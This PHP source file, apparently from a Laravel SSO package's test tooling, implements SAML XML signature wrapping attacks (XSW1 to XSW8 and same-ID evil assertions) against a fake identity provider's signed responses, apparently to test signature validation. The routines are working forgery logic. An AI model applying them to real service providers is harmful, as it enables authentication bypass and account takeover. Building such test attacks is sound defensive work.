<?php

declare(strict_types = 1);

namespace SineMacula\Laravel\Sso\Testing\Saml;

/**
 * Signature wrapping attacks on the fake identity provider's signed responses:
 * XSW1 to XSW8 (Somorovsky et al., "On Breaking SAML", 2012) and same-`ID` evil
 * assertions.
 *
 * @author      Ben Carey <bdmc@sinemacula.co.uk>
 * @copyright   2026 Sine Macula Limited
 */
final readonly class SignatureWrapping
{
    /** @var list<string> The variants, by name. */
    public const array VARIANTS = ['xsw1', 'xsw2', 'xsw3', 'xsw4', 'xsw5', 'xsw6', 'xsw7', 'xsw8', 'same_id_before', 'same_id_after'];

    /** @var list<string> The variants that wrap a signed response rather than a signed assertion. */
    public const array RESPONSE_VARIANTS = ['xsw1', 'xsw2'];

    /** @var string The XML signature namespace. */
    private const string NS_DS = 'http://www.w3.org/2000/09/xmldsig#';

    /**
     * The signed document attacked with the evil response (XSW1, XSW2) or the
     * evil assertion (every other variant).
     *
     * @param  string  $variant
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \LogicException
     */
    public function apply(string $variant, \DOMDocument $signed, string $evil): \DOMDocument
    {
        try {
            return $this->wrapped($variant, $signed, $evil);
        } catch (\DOMException $exception) {
            throw new \LogicException('The fake identity provider could not wrap its response.', 0, $exception);
        }
    }

    /**
     * The document `apply()` returns, letting a DOM failure through.
     *
     * @param  string  $variant
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \InvalidArgumentException
     * @throws \LogicException
     * @throws \DOMException
     */
    private function wrapped(string $variant, \DOMDocument $signed, string $evil): \DOMDocument
    {
        return match (self::known($variant)) {
            'xsw1', 'xsw2'           => self::wrappedResponse($signed, self::load($evil), $variant === 'xsw2'),
            'xsw3', 'same_id_before' => self::before($signed, $evil),
            'xsw4'                   => self::nested($signed, $evil),
            'xsw5', 'xsw6', 'xsw8'   => self::stolenSignature($signed, $evil, $variant),
            'xsw7'                   => self::inExtensions($signed, $evil),
            default                  => self::after($signed, $evil),
        };
    }

    /**
     * The variant, if it is known.
     *
     * @param  string  $variant
     * @return string
     *
     * @throws \InvalidArgumentException
     */
    private static function known(string $variant): string
    {
        return in_array($variant, self::VARIANTS, true) ? $variant : throw new \InvalidArgumentException(sprintf('No wrapping variant [%s].', $variant));
    }

    /**
     * XSW1 and XSW2: the evil response at the root carries the original's
     * signature; the original response, its signature removed, sits inside that
     * signature (XSW1) or before it as a sibling (XSW2).
     *
     * @param  \DOMDocument  $original
     * @param  \DOMDocument  $evil
     * @param  bool  $detached
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function wrappedResponse(\DOMDocument $original, \DOMDocument $evil, bool $detached): \DOMDocument
    {
        $root      = self::root($original);
        $evilRoot  = self::root($evil);
        $signature = $evil->importNode(self::signatureOf($root), true);

        $evilRoot->insertBefore($signature, self::issuerOf($evilRoot)->nextSibling);

        $copy = $evil->importNode(self::unsigned($root), true);

        $detached ? $evilRoot->insertBefore($copy, $signature) : $signature->appendChild($copy);

        return $evil;
    }

    /**
     * XSW3 and the same-`ID` variant before: the evil assertion before the
     * signed one.
     *
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function before(\DOMDocument $signed, string $evil): \DOMDocument
    {
        $assertion = self::assertionOf($signed);

        self::root($signed)->insertBefore(self::imported($signed, $evil), $assertion);

        return $signed;
    }

    /**
     * The same-`ID` variant after: the evil assertion after the signed one.
     *
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function after(\DOMDocument $signed, string $evil): \DOMDocument
    {
        self::root($signed)->appendChild(self::imported($signed, $evil));

        return $signed;
    }

    /**
     * XSW4: the signed assertion nested as the last child of the evil one.
     *
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function nested(\DOMDocument $signed, string $evil): \DOMDocument
    {
        $assertion = self::assertionOf($signed);
        $wrapper   = self::imported($signed, $evil);

        self::root($signed)->replaceChild($wrapper, $assertion);
        $wrapper->appendChild($assertion);

        return $signed;
    }

    /**
     * XSW5, XSW6 and XSW8: the evil assertion carries the signed one's
     * signature; the original, its signature removed, is appended to the
     * response (XSW5), placed inside that signature (XSW6), or inside a
     * `ds:Object` in it (XSW8).
     *
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @param  string  $variant
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function stolenSignature(\DOMDocument $signed, string $evil, string $variant): \DOMDocument
    {
        $assertion = self::assertionOf($signed);
        $signature = self::signatureOf($assertion)->cloneNode(true);
        $copy      = self::unsigned(self::element($assertion->cloneNode(true)));
        $wrapper   = self::imported($signed, $evil);

        $wrapper->insertBefore($signature, self::issuerOf($wrapper)->nextSibling);
        self::root($signed)->replaceChild($wrapper, $assertion);

        match ($variant) {
            'xsw5'  => self::root($signed)->appendChild($copy),
            'xsw6'  => $signature->appendChild($copy),
            default => $signature->appendChild($signed->createElementNS(self::NS_DS, 'ds:Object'))->appendChild($copy),
        };

        return $signed;
    }

    /**
     * XSW7: the signed assertion moved into `samlp:Extensions`, the evil one in
     * its schema position.
     *
     * @param  \DOMDocument  $signed
     * @param  string  $evil
     * @return \DOMDocument
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function inExtensions(\DOMDocument $signed, string $evil): \DOMDocument
    {
        $root       = self::root($signed);
        $assertion  = self::assertionOf($signed);
        $extensions = $signed->createElementNS(ResponseWriter::NS_SAMLP, 'samlp:Extensions');

        foreach ($root->childNodes as $child) {
            if ($child instanceof \DOMElement && $child->localName === 'Status') {
                $root->insertBefore($extensions, $child);
                break;
            }
        }

        $root->replaceChild(self::imported($signed, $evil), $assertion);
        $extensions->appendChild($assertion);

        return $signed;
    }

    /**
     * The element with its own `ds:Signature` children removed.
     *
     * @param  \DOMElement  $element
     * @return \DOMElement
     */
    private static function unsigned(\DOMElement $element): \DOMElement
    {
        foreach (iterator_to_array($element->childNodes) as $child) {

            if (!$child instanceof \DOMElement || $child->namespaceURI !== self::NS_DS || $child->localName !== 'Signature') {
                continue;
            }

            $element->removeChild($child);
        }

        return $element;
    }

    /**
     * The document's first `saml:Assertion` child of its root.
     *
     * @param  \DOMDocument  $document
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function assertionOf(\DOMDocument $document): \DOMElement
    {
        return self::childNamed(self::root($document), 'Assertion');
    }

    /**
     * The element's `ds:Signature` child.
     *
     * @param  \DOMElement  $element
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function signatureOf(\DOMElement $element): \DOMElement
    {
        return self::childNamed($element, 'Signature');
    }

    /**
     * The element's `saml:Issuer` child.
     *
     * @param  \DOMElement  $element
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function issuerOf(\DOMElement $element): \DOMElement
    {
        return self::childNamed($element, 'Issuer');
    }

    /**
     * The element's first child with the local name.
     *
     * @param  \DOMElement  $element
     * @param  string  $name
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function childNamed(\DOMElement $element, string $name): \DOMElement
    {
        foreach ($element->childNodes as $child) {
            if ($child instanceof \DOMElement && $child->localName === $name) {
                return $child;
            }
        }

        throw new \LogicException(sprintf('The element to wrap has no %s.', $name));
    }

    /**
     * The XML parsed into the document as an element.
     *
     * @param  \DOMDocument  $document
     * @param  string  $xml
     * @return \DOMElement
     *
     * @throws \LogicException
     * @throws \DOMException
     */
    private static function imported(\DOMDocument $document, string $xml): \DOMElement
    {
        return self::element($document->importNode(self::root(self::load($xml)), true));
    }

    /**
     * The XML parsed.
     *
     * @param  string  $xml
     * @return \DOMDocument
     *
     * @throws \LogicException
     */
    private static function load(string $xml): \DOMDocument
    {
        $document = new \DOMDocument;

        if (!$document->loadXML($xml, LIBXML_NONET)) {
            throw new \LogicException('The fake identity provider wrote XML it cannot parse.');
        }

        return $document;
    }

    /**
     * The document's root.
     *
     * @param  \DOMDocument  $document
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function root(\DOMDocument $document): \DOMElement
    {
        return $document->documentElement ?? throw new \LogicException('The document to wrap has a root.');
    }

    /**
     * The node, as the element it is.
     *
     * @param  mixed  $node
     * @return \DOMElement
     *
     * @throws \LogicException
     */
    private static function element(mixed $node): \DOMElement
    {
        return $node instanceof \DOMElement ? $node : throw new \LogicException('The node to wrap is an element.');
    }
}
